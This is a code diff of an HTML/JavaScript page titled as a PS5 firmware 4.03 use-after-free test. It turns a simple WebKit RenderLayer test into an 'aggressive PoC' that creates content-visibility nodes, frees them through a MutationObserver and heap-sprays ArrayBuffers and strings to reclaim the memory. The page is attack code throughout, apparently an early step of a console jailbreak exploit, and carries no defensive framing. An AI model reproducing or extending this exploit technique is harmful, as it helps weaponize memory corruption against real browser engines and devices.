@@ -2,63 +2,73 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>UAF Test - WebKit RenderLayer</title>
+  <title>PS5 4.03 - UAF Test (Real)</title>
   <style>
-    #victim {
-      width: 100px;
-      height: 100px;
-      background: red;
-      content-visibility: auto;
-      overflow: hidden;
-    }
+    body { background: #000; color: #0f0; font-family: monospace; }
+    #log { white-space: pre-wrap; }
+    .spray { width: 1px; height: 1px; overflow: hidden; }
   </style>
 </head>
 <body>
-  <div id="container"></div>
+  <div id="log">[+] Iniciando PoC agresivo para PS5 FW 4.03...\n</div>
 
   <script>
     function log(msg) {
-      const el = document.createElement("pre");
-      el.textContent = msg;
-      document.body.appendChild(el);
+      document.getElementById("log").textContent += msg + "\n";
     }
 
-    function sprayHeap() {
-      let spray = [];
+    const sprayArray = [];
+
+    function sprayStrings() {
+      log("[*] Realizando heap spray (cadenas)...");
+      for (let i = 0; i < 20000; i++) {
+        let str = "A".repeat(0x4000);
+        sprayArray.push(str + i);
+      }
+    }
+
+    function sprayBuffers() {
+      log("[*] Realizando heap spray (ArrayBuffers)...");
       for (let i = 0; i < 10000; i++) {
         let ab = new ArrayBuffer(0x1000);
         let dv = new DataView(ab);
         dv.setUint32(0, 0x41414141, true);
-        spray.push(ab);
+        sprayArray.push(ab);
       }
-      log("Heap sprayed");
-      return spray;
     }
 
-    function triggerUAF() {
-      let div = document.createElement("div");
-      div.id = "victim";
-      document.getElementById("container").appendChild(div);
+    function trigger() {
+      log("[*] Preparando nodos para UAF...");
+      const container = document.createElement("div");
+      document.body.appendChild(container);
 
-      let inner = document.createElement("div");
-      div.appendChild(inner);
+      for (let i = 0; i < 1000; i++) {
+        const victim = document.createElement("div");
+        victim.style.contentVisibility = "auto";
+        victim.style.overflow = "hidden";
+        victim.className = "spray";
+        container.appendChild(victim);
+      }
 
-      let mo = new MutationObserver(() => {
-        document.getElementById("container").removeChild(div);
-        sprayHeap(); // Intentamos ocupar la memoria liberada
-        log("Possible UAF triggered");
+      log("[*] Realizando manipulación DOM...");
+      const observer = new MutationObserver(() => {
+        container.remove();
+        sprayBuffers(); // Ocupamos memoria tras liberación
+        sprayStrings(); // Reforzamos colisión
+        log("[!] Trigger lanzado. Observa cuelgue o comportamiento anómalo.");
       });
 
-      mo.observe(div, { childList: true });
-
-      // Provoca el cambio de visibilidad y truncamiento
-      div.style.contentVisibility = "visible";
-      inner.textContent = "This is a test of the emergency broadcast system.";
+      observer.observe(container, { childList: true });
+      setTimeout(() => {
+        const elem = document.createElement("div");
+        elem.textContent = "trigger";
+        container.appendChild(elem);
+      }, 100);
     }
 
     window.onload = () => {
-      log("Starting UAF test...");
-      setTimeout(triggerUAF, 100);
+      log("[+] PoC cargado correctamente.");
+      setTimeout(trigger, 500);
     };
   </script>
 </body>
